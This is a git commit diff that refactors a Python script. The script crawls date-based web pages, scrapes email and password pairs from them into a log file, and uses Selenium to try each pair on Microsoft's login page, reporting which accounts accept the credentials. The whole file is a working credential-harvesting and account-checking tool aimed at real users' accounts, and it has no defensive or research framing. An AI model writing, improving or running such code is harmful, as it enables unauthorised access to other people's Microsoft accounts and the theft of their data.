383669c5fbe7daac829a94d318d0993176e7dd2d
zombyacoff <zombyacoff@gmail.com>
2024-05-15 13:04:17 +0300

    troubleshooting

--- lp_parser.py
+++ lp_parser.py
@@ -14,32 +14,10 @@ import time
 option = webdriver.ChromeOptions()
 option.add_argument("start-maximized")
 
-def MicrosoftCheck(data : list[str]) -> bool:
-    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=option)
-    driver.get('https://login.live.com/ppsecure/secure.srf')
-    time.sleep(2)
-    login = driver.find_element(By.ID,'i0116').send_keys(data[0])
-    time.sleep(1)
-    loginButton = driver.find_element(By.XPATH,'//*[@id="idSIButton9"]').click()
-    time.sleep(1)
-    code = driver.find_element(By.ID,'i0118').send_keys(data[1])
-    time.sleep(1)
-    codeButton = driver.find_element(By.XPATH,'//*[@id="idSIButton9"]').click()
-    time.sleep(1)
-    try:
-        if driver.find_element(By.ID,'i0118Error') or driver.find_element(By.ID,'idTD_Error') or driver.find_element(By.ID,'iSelectProofTitle'):
-            return False
-    except Exception:
-        return True
-    driver.close()
-
-
 launchTime = datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
 
-logFile = open(f"{launchTime}.txt", 'w+')
-
 with open("settings.yml") as s: settings = yaml.safe_load(s)
-websites = settings["websites_list"]
+websitesList = settings["websites_list"]
 
 offset = settings["offset"]
 offsetBool = offset["offset"]
@@ -51,36 +29,75 @@ releaseDateYears = releaseDate["years"]
 
 s.close()
 
-def progressBar(current : int, total : int):
-    percent = 100 * current/total
-    print(f"\r{round(percent)*'█'+(100-round(percent))*'#'} [{round(percent,1)}%]", end='\r')
+microsoftLoginUrl = "https://login.live.com/ppsecure/secure.srf"
 
-def parse(url : str):
+emailRegex = r"\S+@\S+\.\S+"
+passwordRegex = r"(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}"
+
+def progress_bar(current : int, total : int) -> None:
+    percent = 100 * current/total
+    round_percent = round(percent)
+    
+    print(f"\r{round_percent*"█"+(100-round_percent)*"#"} [{percent:.2f}%]", end="\r")
+
+def microsoft_check(data : list[str]) -> bool:
+    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=option)
+    driver.get(microsoftLoginUrl)
+    time.sleep(2)
+    driver.find_element(By.ID,"i0116").send_keys(data[0])
+    time.sleep(1)
+    driver.find_element(By.XPATH,"//*[@id='idSIButton9']").click()
+    time.sleep(1)
+    driver.find_element(By.ID,"i0118").send_keys(data[1])
+    time.sleep(1)
+    driver.find_element(By.XPATH,"//*[@id='idSIButton9']").click()
+    time.sleep(1)
+    try:
+        if driver.find_element(By.ID,"i0118Error") or driver.find_element(By.ID,"idTD_Error") or driver.find_element(By.ID,"iSelectProofTitle"):
+            return False
+    except:
+        return True
+    driver.close()
+
+def check_url(url : str) -> None:
     page = requests.get(url)
+
     if page.status_code != 404:
         soup = BeautifulSoup(page.text, "html.parser")
-        release_date = int(soup.select_one("time").get_text('\n', strip=True)[-4:])
+        release_date = int(soup.select_one("time").get_text("\n", strip=True)[-4:])
         if not releaseDateBool or release_date in releaseDateYears:
-            text = [i for i in soup.stripped_strings]
-            for i in range(len(text)):
-                login = re.findall(r"\S+@\S+\.\S+", text[i])
-                if login and login != ["dmca@telegram.org"]:
-                    if len(text[i+1]) < 14: password = text[i+2]
-                    else: password = text[i+1].split()[-1]
-                    logFile.write('\n'.join([url, *login, password, '\n'])); logFile.flush()
+            parse(url, soup)
+
+def parse(url : str, soup : BeautifulSoup) -> None:
+    website_text = [sentence for sentence in soup.stripped_strings]
+
+    for i, current in enumerate(website_text):
+        login = re.findall(emailRegex, current)
+        if login:
+            password = website_text[i+1].split()[-1] if re.findall(passwordRegex, website_text[i+1]) else website_text[i+2]
+            write_file([url, login[0], password])
+            break
+
+def write_file(values : list[str]) -> None:
+    for value in values:
+        logFile.write(value+"\n")
+        logFile.flush()
 
 def main():
+    global logFile
+    logFile = open(f"{launchTime}.txt", "w+")
+
     counter = 1
     for month in range(1, 13):
         for day in range(1, monthrange(2020, month)[1]+1):
-            websitesList = [url+f"-{month:02}-{day:02}" for url in websites]
-            if offsetBool:
-                for i in range(len(websites)):
-                    for k in range(2, offsetValue+1):
-                        websitesList.append([url+f"-{month:02}-{day:02}-{k}" for url in websites][i])
-            for url in websitesList: parse(url)
-            progressBar(counter, 366)
-            counter += 1
+            for value in range(0, offsetValue if offsetBool else 1):
+                url_list = [url+f"-{month:02}-{day:02}-{value}" if value > 0 
+                            else url+f"-{month:02}-{day:02}" 
+                            for url in websitesList]
+                for url in url_list:
+                    check_url(url)
+                progress_bar(counter, 366)
+                counter += 1
 
     logFile.close()
     os.rename(f"{launchTime}.txt", f"{launchTime}_complete.txt")
